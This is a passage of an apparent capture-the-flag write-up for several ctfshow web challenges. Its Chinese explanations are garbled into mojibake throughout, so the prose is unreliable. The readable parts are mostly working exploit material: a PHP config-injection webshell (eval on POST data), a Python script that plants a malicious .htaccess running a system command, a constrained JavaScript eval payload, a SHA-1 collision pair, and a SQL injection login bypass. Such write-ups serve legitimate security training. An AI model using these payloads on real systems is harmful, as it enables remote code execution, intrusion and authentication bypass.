<p>æ¥ç€çœ‹preg_replaceå‡½æ•°<br><code>preg_replace($pattern, $replacement, $string);</code><br>æœç´¢stringä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œä»¥replacementè¿›è¡Œæ›¿æ¢ã€‚</p>
<p>æœ€ç»ˆconfig.phpçš„å†…å®¹ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$option</span>=<span class="hljs-string">&#x27;a\\&#x27;</span>;<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-comment">//&#x27;;</span><br></code></pre></td></tr></table></figure>
<p>è¿™æ ·å°±æ„é€ äº†ä¸€ä¸ªphpinfo();<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web692-1.png"></p>
<p>æ‰€ä»¥ç›´æ¥ä¸Šä¼ phpé©¬<br><code>?option=a\&#39;;eval($_POST[a]);//</code></p>
<p><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web692-2.png"></p>
<h1 id="WEB701"><a href="#WEB701" class="headerlink" title="WEB701"></a>WEB701</h1><p>å‡ºè‡ª<code>HarekazeCTF2019-A_Z</code><br>æºç </p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;pug&#x27;</span>);<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-keyword">let</span> output = <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">const</span> code = req.<span class="hljs-property">query</span>.<span class="hljs-property">code</span> + <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">if</span> (code &amp;&amp; code.<span class="hljs-property">length</span> &lt; <span class="hljs-number">200</span> &amp;&amp; !<span class="hljs-regexp">/[^a-z().]/</span>.<span class="hljs-title function_">test</span>(code)) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">const</span> result = vm.<span class="hljs-title function_">runInNewContext</span>(code, &#123;&#125;, &#123; <span class="hljs-attr">timeout</span>: <span class="hljs-number">500</span> &#125;);<br>      <span class="hljs-keyword">if</span> (result === <span class="hljs-number">1337</span>) &#123;<br>        output = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        output = <span class="hljs-string">&#x27;nope&#x27;</span>;<br>      &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>      output = <span class="hljs-string">&#x27;nope&#x27;</span>;<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    output = <span class="hljs-string">&#x27;nope&#x27;</span>;<br>  &#125;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;[a-z().]&#x27;</span>, output &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;app.js&#x27;</span>));<br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = app;<br></code></pre></td></tr></table></figure>
<p>æˆ‘ä»¬åªèƒ½ä½¿ç”¨[a-z().]è¿™äº›å­—ç¬¦æ„é€ å‡º<code>1337</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (result === <span class="hljs-number">1337</span>) &#123;<br>        output = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span>;<br>      &#125;<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥ç”¨<code>(typeof(this)).constructor()</code>æ„é€ å‡ºç©ºå­—ç¬¦ä¸²ï¼Œè€ŒJSä¸­1&#x3D;&#x3D;trueï¼Œæ‰€ä»¥<code>(typeof(this)).constructor().length.constructor(true)</code>å°±ä¼šæ„é€ å‡º1ï¼Œæˆ–è€…<code>true.constructor.length</code>ã€‚3å¯ä»¥ç”¨å­—ç¬¦ä¸²çš„big()æ–¹æ³•çš„name.lengthè·å¾—ï¼Œ7å¯ä»¥ç”¨<code>true.constructor.name.length</code>å¾—åˆ°ã€‚æœ€åå°†æ‰€æœ‰å­—ç¬¦concatåœ¨ä¸€èµ·å³å¯ã€‚</p>
<p>æ‰€ä»¥æœ€åPayloadï¼ˆä¸å”¯ä¸€ï¼‰ï¼š<code>eval((typeof(this)).constructor().concat(true.constructor.length).concat((typeof(this)).big.name.length).concat((typeof(this)).big.name.length).concat(true.constructor.name.length))</code></p>
<h1 id="WEB712"><a href="#WEB712" class="headerlink" title="WEB712"></a>WEB712</h1><p>å‡ºè‡ª<code>XNUCA 2019 EasyPHP</code></p>
<p>é¢˜ç›®ç»™äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">include_once</span>(<span class="hljs-string">&quot;fl3g.php&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;on&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;html&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;type&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;upload&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;file&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[^a-z\.]/&quot;</span>, <span class="hljs-variable">$filename</span>) !== <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span> . <span class="hljs-string">&quot;\nJust one chance&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>2-9,25-32è¡Œçš„æ„æ€æ˜¯åˆ é™¤é™¤äº†æ–‡ä»¶åæ˜¯index.phpçš„æ–‡ä»¶<br>10è¡ŒåŒ…å«äº†fl3g.phpæ–‡ä»¶<br>16-19å¯¹contentå‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶å†…å®¹è¿›è¡Œäº†å…³é”®è¯è¿‡æ»¤<br>21-24å¯¹filenameå‚æ•°è¿›è¡Œäº†æ­£åˆ™è¿‡æ»¤ï¼Œä½¿æ–‡ä»¶ååªå…è®¸å‡ºç°a-zå’Œç‚¹</p>
<p>åˆ†æå®Œåå‘ç°å¥½åƒå¯¹æˆ‘ä»¬å†™shellæ²¡ä»€ä¹ˆå½±å“<br>ã€‚ã€‚ä¼ å®Œåå‘ç°ä¸èƒ½è§£æï¼Œåº”è¯¥æ˜¯å‡ºé¢˜çš„æ—¶å€™è®¾ç½®äº†åªèƒ½è§£æindex.php<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web712-1.png"></p>
<p>è¿™ä¸ªæ—¶å€™æƒ³åˆ°äº†ä¹‹å‰åšæ–‡ä»¶ä¸Šä¼ æ—¶ç»å¸¸ç”¨åˆ°çš„<code>.htaccess</code>ï¼Œç›´æ¥è®¾ç½®<code>AddType</code>æˆ–è€…<code>SetHandler</code>ä¸å°±è¡Œäº†å—,ä½†æ˜¯å›è¿‡å»çœ‹é‚£äº›çœ‹ä¼¼æ— ç”¨çš„å…³é”®è¯è¿‡æ»¤ï¼Œå®é™…ä¸ŠæŠŠè¿™ä¸¤ç§æƒ…å†µç¦ç”¨äº†</p>
<p>è€Œä¸”å†…å®¹ä¸­è¿˜æ‹¼æ¥äº†<code>Just one chance</code>,åœ¨<code>.htaccess</code>ä¸­ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥è¦æŠŠå®ƒæ³¨é‡Šæ‰ï¼Œå…ˆåˆ©ç”¨<code>\</code>æ‹¼æ¥ä¸Šä¸‹ä¸¤è¡Œï¼Œå†ç”¨<code>#</code>æ³¨é‡Š</p>
<p>æ—¢ç„¶å¯ä»¥ç”¨<code>\</code>ï¼Œé‚£ä¹ˆä¹Ÿå°±å¯ä»¥ç»•è¿‡è¿‡æ»¤äº†ï¼Œä»è€Œå†™å…¥è¢«é™åˆ¶çš„å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@autor: Iv4n</span><br><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://f47cd164-0248-4cca-993d-8610c32a4aa1.challenge.ctf.show/&#x27;</span><br>r = requests.get(url+<span class="hljs-string">&#x27;?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20&quot;.htaccess&quot;%0AErrorDocument%20404%20&quot;&lt;?php%20system(\&#x27;cat%20../../../fl[a]g\&#x27;);?&gt;\\&#x27;</span>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<p><code>php_value auto_prepend_file</code>å°†è‡ªèº«åŠ è½½åˆ°index.phpï¼Œç„¶åå†™ä¸€å¥è¯æœ¨é©¬ï¼Œç›´æ¥å†™çš„è¯ä¼šå¯¼è‡´500ï¼Œæ‰€ä»¥é€šè¿‡<code>ErrorDocument 404</code></p>
<p><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web712-2.png"></p>
<h1 id="WEB720"><a href="#WEB720" class="headerlink" title="WEB720"></a>WEB720</h1><p>sha1çš„å¼ºæ¯”è¾ƒ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>æ‰¾åˆ°ä¸¤ä¸ªsha1åç›¸ç­‰çš„å€¼å³å¯</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?name</span>=<span class="hljs-meta">%25PDF-1</span>.<span class="hljs-number">3</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%25</span><span class="hljs-meta">%E2</span><span class="hljs-meta">%E3</span><span class="hljs-meta">%CF</span><span class="hljs-meta">%D3</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A1</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20obj</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%3C</span><span class="hljs-meta">%3C</span>/Width<span class="hljs-meta">%202</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Height<span class="hljs-meta">%203</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Type<span class="hljs-meta">%204</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Subtype<span class="hljs-meta">%205</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Filter<span class="hljs-meta">%206</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/ColorSpace<span class="hljs-meta">%207</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Length<span class="hljs-meta">%208</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/BitsPerComponent<span class="hljs-meta">%208</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%0Astream</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%D8</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%00</span><span class="hljs-meta">%24SHA-1</span><span class="hljs-meta">%20is</span><span class="hljs-meta">%20dead</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%85</span>/<span class="hljs-meta">%EC</span><span class="hljs-meta">%09</span><span class="hljs-meta">%239u</span><span class="hljs-meta">%9C9</span><span class="hljs-meta">%B1</span><span class="hljs-meta">%A1</span><span class="hljs-meta">%C6</span><span class="hljs-meta">%3CL</span><span class="hljs-meta">%97</span><span class="hljs-meta">%E1</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%01</span><span class="hljs-meta">%7FF</span><span class="hljs-meta">%DC</span><span class="hljs-meta">%93</span><span class="hljs-meta">%A6</span><span class="hljs-meta">%B6</span><span class="hljs-meta">%7E</span><span class="hljs-meta">%01</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%02</span><span class="hljs-meta">%9A</span><span class="hljs-meta">%AA</span><span class="hljs-meta">%1D</span><span class="hljs-meta">%B2V</span><span class="hljs-meta">%0BE</span><span class="hljs-meta">%CAg</span><span class="hljs-meta">%D6</span><span class="hljs-meta">%88</span><span class="hljs-meta">%C7</span><span class="hljs-meta">%F8K</span><span class="hljs-meta">%8CLy</span><span class="hljs-meta">%1F</span><span class="hljs-meta">%E0</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%F6</span><span class="hljs-meta">%14</span><span class="hljs-meta">%F8m</span><span class="hljs-meta">%B1i</span><span class="hljs-meta">%09</span><span class="hljs-meta">%01</span><span class="hljs-meta">%C5kE</span><span class="hljs-meta">%C1S</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%DF</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%608</span><span class="hljs-meta">%E9rr</span>/<span class="hljs-meta">%E7</span><span class="hljs-meta">%ADr</span><span class="hljs-meta">%8F</span><span class="hljs-meta">%0EI</span><span class="hljs-meta">%04</span><span class="hljs-meta">%E0F</span><span class="hljs-meta">%C20W</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%E9</span><span class="hljs-meta">%D4</span><span class="hljs-meta">%13</span><span class="hljs-meta">%98</span><span class="hljs-meta">%AB</span><span class="hljs-meta">%E1</span>.<span class="hljs-meta">%F5</span><span class="hljs-meta">%BC</span><span class="hljs-meta">%94</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%E35B</span><span class="hljs-meta">%A4</span><span class="hljs-meta">%80-</span><span class="hljs-meta">%98</span><span class="hljs-meta">%B5</span><span class="hljs-meta">%D7</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%2A3</span>.<span class="hljs-meta">%C3</span><span class="hljs-meta">%7F</span><span class="hljs-meta">%AC5</span><span class="hljs-meta">%14</span><span class="hljs-meta">%E7M</span><span class="hljs-meta">%DC</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%A8t</span><span class="hljs-meta">%CD</span><span class="hljs-meta">%0Cx0Z</span><span class="hljs-meta">%21Vda0</span><span class="hljs-meta">%97</span><span class="hljs-meta">%89</span><span class="hljs-meta">%60k</span><span class="hljs-meta">%D0</span><span class="hljs-meta">%BF</span><span class="hljs-meta">%3F</span><span class="hljs-meta">%98</span><span class="hljs-meta">%CD</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%04F</span><span class="hljs-meta">%29</span><span class="hljs-meta">%A1</span>&amp;password=<span class="hljs-meta">%25PDF-1</span>.<span class="hljs-number">3</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%25</span><span class="hljs-meta">%E2</span><span class="hljs-meta">%E3</span><span class="hljs-meta">%CF</span><span class="hljs-meta">%D3</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%0A1</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20obj</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%3C</span><span class="hljs-meta">%3C</span>/Width<span class="hljs-meta">%202</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Height<span class="hljs-meta">%203</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Type<span class="hljs-meta">%204</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Subtype<span class="hljs-meta">%205</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Filter<span class="hljs-meta">%206</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/ColorSpace<span class="hljs-meta">%207</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/Length<span class="hljs-meta">%208</span><span class="hljs-meta">%200</span><span class="hljs-meta">%20R</span>/BitsPerComponent<span class="hljs-meta">%208</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%3E</span><span class="hljs-meta">%0Astream</span><span class="hljs-meta">%0A</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%D8</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%00</span><span class="hljs-meta">%24SHA-1</span><span class="hljs-meta">%20is</span><span class="hljs-meta">%20dead</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%21</span><span class="hljs-meta">%85</span>/<span class="hljs-meta">%EC</span><span class="hljs-meta">%09</span><span class="hljs-meta">%239u</span><span class="hljs-meta">%9C9</span><span class="hljs-meta">%B1</span><span class="hljs-meta">%A1</span><span class="hljs-meta">%C6</span><span class="hljs-meta">%3CL</span><span class="hljs-meta">%97</span><span class="hljs-meta">%E1</span><span class="hljs-meta">%FF</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%01sF</span><span class="hljs-meta">%DC</span><span class="hljs-meta">%91f</span><span class="hljs-meta">%B6</span><span class="hljs-meta">%7E</span><span class="hljs-meta">%11</span><span class="hljs-meta">%8F</span><span class="hljs-meta">%02</span><span class="hljs-meta">%9A</span><span class="hljs-meta">%B6</span><span class="hljs-meta">%21</span><span class="hljs-meta">%B2V</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%F9</span><span class="hljs-meta">%CAg</span><span class="hljs-meta">%CC</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%C7</span><span class="hljs-meta">%F8</span><span class="hljs-meta">%5B</span><span class="hljs-meta">%A8Ly</span><span class="hljs-meta">%03</span><span class="hljs-meta">%0C</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%E2</span><span class="hljs-meta">%18</span><span class="hljs-meta">%F8m</span><span class="hljs-meta">%B3</span><span class="hljs-meta">%A9</span><span class="hljs-meta">%09</span><span class="hljs-meta">%01</span><span class="hljs-meta">%D5</span><span class="hljs-meta">%DFE</span><span class="hljs-meta">%C1O</span><span class="hljs-meta">%26</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%DF</span><span class="hljs-meta">%B3</span><span class="hljs-meta">%DC8</span><span class="hljs-meta">%E9j</span><span class="hljs-meta">%C2</span>/<span class="hljs-meta">%E7</span><span class="hljs-meta">%BDr</span><span class="hljs-meta">%8F</span><span class="hljs-meta">%0EE</span><span class="hljs-meta">%BC</span><span class="hljs-meta">%E0F</span><span class="hljs-meta">%D2</span><span class="hljs-meta">%3CW</span><span class="hljs-meta">%0F</span><span class="hljs-meta">%EB</span><span class="hljs-meta">%14</span><span class="hljs-meta">%13</span><span class="hljs-meta">%98</span><span class="hljs-meta">%BBU</span>.<span class="hljs-meta">%F5</span><span class="hljs-meta">%A0</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%E31</span><span class="hljs-meta">%FE</span><span class="hljs-meta">%A4</span><span class="hljs-meta">%807</span><span class="hljs-meta">%B8</span><span class="hljs-meta">%B5</span><span class="hljs-meta">%D7</span><span class="hljs-meta">%1F</span><span class="hljs-meta">%0E3</span>.<span class="hljs-meta">%DF</span><span class="hljs-meta">%93</span><span class="hljs-meta">%AC5</span><span class="hljs-meta">%00</span><span class="hljs-meta">%EBM</span><span class="hljs-meta">%DC</span><span class="hljs-meta">%0D</span><span class="hljs-meta">%EC</span><span class="hljs-meta">%C1</span><span class="hljs-meta">%A8dy</span><span class="hljs-meta">%0Cx</span><span class="hljs-meta">%2Cv</span><span class="hljs-meta">%21V</span><span class="hljs-meta">%60</span><span class="hljs-meta">%DD0</span><span class="hljs-meta">%97</span><span class="hljs-meta">%91</span><span class="hljs-meta">%D0k</span><span class="hljs-meta">%D0</span><span class="hljs-meta">%AF</span><span class="hljs-meta">%3F</span><span class="hljs-meta">%98</span><span class="hljs-meta">%CD</span><span class="hljs-meta">%A4</span><span class="hljs-meta">%BCF</span><span class="hljs-meta">%29</span><span class="hljs-meta">%B1</span><br></code></pre></td></tr></table></figure>

<h1 id="WEB721"><a href="#WEB721" class="headerlink" title="WEB721"></a>WEB721</h1><p>F12çœ‹æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!-- CTFSHOW hint:<br>      <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$row</span>[pass]) &amp;&amp; (!<span class="hljs-title function_ invoke__">strcasecmp</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>), <span class="hljs-variable">$row</span>[pass]))) &#123;<br>              <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Logged in! &quot;</span>.<span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot; &lt;/p&gt;&quot;</span>;<br>        &#125;<br>--&gt;<br></code></pre></td></tr></table></figure>

<p>ä»æ•°æ®åº“ä¸­æå–å‡ºpass ç„¶åé€»è¾‘ä¸ ä¸å³è¾¹çš„(!strcasecmp($pass, $row[pass])) ä¸¤æ¡è¯­å¥éƒ½ä¸ºçœŸæ‰ä¼šæ‰“å°å‡ºflag</p>
<p>æ„é€ ä¸€ä¸ªè”åˆæŸ¥è¯¢:è¿™æ ·ç¬¬ä¸€æ¡è¯­å¥æŸ¥è¯¢<code>a</code>è¿™ä¸ªç”¨æˆ·æŸ¥ä¸åˆ°,ç„¶åç¬¬äºŒä¸ªæ ¹æ®ç‰¹æ€§ä¼šè¿”å›è¿™ä¸ªç»“æœåˆ°passwordå­—æ®µä¸‹</p>
<p>payloadï¼š</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><code class="hljs gauss">username:a&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-built_in">md5</span>(<span class="hljs-number">1</span>)<span class="hljs-meta">#</span><br>password:<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h1 id="WEB726"><a href="#WEB726" class="headerlink" title="WEB726"></a>WEB726</h1><p>F12çœ‹æºç <br>è·ŸWEB692ä¸€æ ·ï¼Œæ˜¯Phpå†™å…¥é…ç½®æ–‡ä»¶çš„ç»å…¸æ¼æ´</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;!-- CTFSHOW hint:<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|\$db=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="hljs-string">&quot;\$db=&#x27;<span class="hljs-subst">$username</span>&#x27;;&quot;</span>, <span class="hljs-variable">$file</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>, <span class="hljs-variable">$file</span>);<br>--&gt;<br></code></pre></td></tr></table></figure>

<p>ä½†æ˜¯ç”¨692çš„æ–¹æ³•åšä¸å‡ºæ¥ï¼Œè¿™é‡Œç”¨å…¶ä»–æ–¹æ³•ï¼ˆåˆ©ç”¨ preg_replace() å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°çš„é—®é¢˜ï¼‰</p>
<p>æˆ‘ä»¬é¦–å…ˆä¼ å…¥<code>username=;eval($_POST[1]);</code><br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web726-1.jpg"></p>
<p>è¿™æ—¶ï¼Œ<code>config.php</code>æ–‡ä»¶ä¸­çš„å†…å®¹ä¸º</p>
